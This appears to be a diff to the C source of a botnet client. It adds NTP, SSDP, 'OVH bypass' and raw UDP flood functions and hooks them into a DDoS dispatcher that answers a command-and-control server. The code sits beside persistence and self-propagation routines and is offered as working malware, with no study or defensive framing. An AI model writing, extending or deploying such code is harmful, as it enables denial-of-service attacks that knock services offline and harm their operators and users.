@@ -61,6 +61,10 @@
  void bypass_attack(char* target, int port, int duration);
  void dns_flood(char* target, int duration);
  void vse_flood(char* target, int port, int duration);
+ void ntp_flood(char* target, int duration);
+ void ssdp_flood(char* target, int duration);
+ void ovh_bypass(char* target, int port, int duration);
+ void std_flood(char* target, int port, int duration);
  void persist(void);
  void generate_device_id(void);
  void auto_propagate(void);
@@ -791,6 +795,131 @@
      }
  }
  
+ // Fonction pour exécuter une attaque NTP Reflection Flood
+ void ntp_flood(char* target, int duration) {
+     int sock;
+     struct sockaddr_in target_addr;
+     time_t start_time = time(NULL);
+     
+     // Paquet NTP monlist (très amplificateur)
+     unsigned char ntp_packet[] = {
+         0x17, 0x00, 0x03, 0x2a, 0x00, 0x00, 0x00, 0x00
+     };
+     
+     memset(&target_addr, 0, sizeof(target_addr));
+     target_addr.sin_family = AF_INET;
+     target_addr.sin_port = htons(123);
+     if (inet_pton(AF_INET, target, &target_addr.sin_addr) <= 0) return;
+     
+     sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+     if (sock != -1) {
+         int flags = fcntl(sock, F_GETFL, 0);
+         if (flags != -1) fcntl(sock, F_SETFL, flags | O_NONBLOCK);
+         
+         while (time(NULL) - start_time < duration) {
+             for (int i = 0; i < 100; i++) {
+                 sendto(sock, ntp_packet, sizeof(ntp_packet), 0,
+                        (struct sockaddr*)&target_addr, sizeof(target_addr));
+             }
+             usleep(500);
+         }
+         close(sock);
+     }
+ }
+ 
+ // Fonction pour exécuter une attaque SSDP Amplification Flood
+ void ssdp_flood(char* target, int duration) {
+     int sock;
+     struct sockaddr_in target_addr;
+     time_t start_time = time(NULL);
+     
+     char *ssdp_packet = 
+         "M-SEARCH * HTTP/1.1\r\n"
+         "HOST: 239.255.255.250:1900\r\n"
+         "MAN: \"ssdp:discover\"\r\n"
+         "MX: 2\r\n"
+         "ST: ssdp:all\r\n\r\n";
+     
+     memset(&target_addr, 0, sizeof(target_addr));
+     target_addr.sin_family = AF_INET;
+     target_addr.sin_port = htons(1900);
+     if (inet_pton(AF_INET, target, &target_addr.sin_addr) <= 0) return;
+     
+     sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+     if (sock != -1) {
+         int flags = fcntl(sock, F_GETFL, 0);
+         if (flags != -1) fcntl(sock, F_SETFL, flags | O_NONBLOCK);
+         
+         while (time(NULL) - start_time < duration) {
+             for (int i = 0; i < 50; i++) {
+                 sendto(sock, ssdp_packet, strlen(ssdp_packet), 0,
+                        (struct sockaddr*)&target_addr, sizeof(target_addr));
+             }
+             usleep(1000);
+         }
+         close(sock);
+     }
+ }
+ 
+ // Fonction pour exécuter une attaque OVH Bypass
+ void ovh_bypass(char* target, int port, int duration) {
+     int sock;
+     struct sockaddr_in target_addr;
+     time_t start_time = time(NULL);
+     
+     memset(&target_addr, 0, sizeof(target_addr));
+     target_addr.sin_family = AF_INET;
+     target_addr.sin_port = htons(port);
+     if (inet_pton(AF_INET, target, &target_addr.sin_addr) <= 0) return;
+     
+     while (time(NULL) - start_time < duration) {
+         sock = socket(AF_INET, SOCK_STREAM, 0);
+         if (sock != -1) {
+             // Utiliser des options TCP inhabituelles pour tenter de passer les filtres
+             int mss = 512;
+             setsockopt(sock, IPPROTO_TCP, TCP_MAXSEG, &mss, sizeof(mss));
+             
+             int flags = fcntl(sock, F_GETFL, 0);
+             if (flags != -1) fcntl(sock, F_SETFL, flags | O_NONBLOCK);
+             
+             connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr));
+             
+             // Envoyer des données aléatoires très vite
+             char data[128];
+             for(int i=0; i<128; i++) data[i] = rand() % 256;
+             send(sock, data, 128, 0);
+             
+             close(sock);
+         }
+         usleep(500);
+     }
+ }
+ 
+ // Fonction pour exécuter une attaque STD UDP Flood (Standard UDP)
+ void std_flood(char* target, int port, int duration) {
+     int sock;
+     struct sockaddr_in target_addr;
+     time_t start_time = time(NULL);
+     char attack_packet[1024];
+     
+     memset(&target_addr, 0, sizeof(target_addr));
+     target_addr.sin_family = AF_INET;
+     target_addr.sin_port = htons(port);
+     if (inet_pton(AF_INET, target, &target_addr.sin_addr) <= 0) return;
+     
+     for (int i = 0; i < 1024; i++) attack_packet[i] = rand() % 256;
+     
+     sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+     if (sock != -1) {
+         while (time(NULL) - start_time < duration) {
+             sendto(sock, attack_packet, 1024, 0,
+                    (struct sockaddr*)&target_addr, sizeof(target_addr));
+             usleep(100);
+         }
+         close(sock);
+     }
+ }
+ 
  // Fonction principale pour exécuter une attaque DDoS
  void ddos_attack(int c2_socket, char* target, int port, int duration, char* method) {
      // Envoyer un message de confirmation au serveur C2
@@ -824,8 +953,16 @@
      } else if (strcmp(method, "dns") == 0) {
          dns_flood(target, duration);
      } else if (strcmp(method, "vse") == 0) {
-         vse_flood(target, port, duration);
-     } else {
+        vse_flood(target, port, duration);
+    } else if (strcmp(method, "ntp") == 0) {
+        ntp_flood(target, duration);
+    } else if (strcmp(method, "ssdp") == 0) {
+        ssdp_flood(target, duration);
+    } else if (strcmp(method, "ovh") == 0) {
+        ovh_bypass(target, port, duration);
+    } else if (strcmp(method, "std") == 0) {
+        std_flood(target, port, duration);
+    } else {
          // Méthode par défaut : combinaison de plusieurs attaques
          pid_t pid;
          
